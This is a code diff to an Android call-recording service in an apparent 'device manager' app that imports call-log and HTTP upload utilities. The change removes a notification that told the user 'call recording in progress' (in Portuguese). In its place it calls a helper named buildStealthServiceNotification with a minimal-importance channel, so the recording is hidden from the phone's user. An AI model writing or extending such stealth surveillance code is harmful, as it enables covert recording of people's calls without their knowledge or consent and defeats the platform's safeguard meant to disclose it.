@@ -1,8 +1,6 @@
 package com.company.devicemgr.services;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -17,6 +15,7 @@ import android.provider.CallLog;
 import android.util.Log;
 
 import com.company.devicemgr.utils.ApiConfig;
+import com.company.devicemgr.utils.ForegroundNotificationHelper;
 import com.company.devicemgr.utils.HttpClient;
 
 import org.json.JSONArray;
@@ -488,30 +487,12 @@ public class CallRecorderService extends Service {
 
     private void startAsForegroundService() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-                if (notificationManager != null) {
-                    NotificationChannel channel = new NotificationChannel(
-                            CHANNEL_ID,
-                            "DeviceMgr Call Recorder",
-                            NotificationManager.IMPORTANCE_LOW
-                    );
-                    notificationManager.createNotificationChannel(channel);
-                }
-                Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                        .setContentTitle("DeviceMgr")
-                        .setContentText("Gravação de chamada em andamento")
-                        .setSmallIcon(android.R.drawable.ic_btn_speak_now)
-                        .build();
-                startForeground(NOTIFICATION_ID, notification);
-                return;
-            }
-
-            Notification notification = new Notification.Builder(this)
-                    .setContentTitle("DeviceMgr")
-                    .setContentText("Gravação de chamada em andamento")
-                    .setSmallIcon(android.R.drawable.ic_btn_speak_now)
-                    .build();
+            ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "DeviceMgr Call Recorder");
+            Notification notification = ForegroundNotificationHelper.buildStealthServiceNotification(
+                    this,
+                    CHANNEL_ID,
+                    android.R.drawable.ic_btn_speak_now
+            );
             startForeground(NOTIFICATION_ID, notification);
         } catch (Exception e) {
             Log.e(TAG, "startAsForegroundService failed", e);
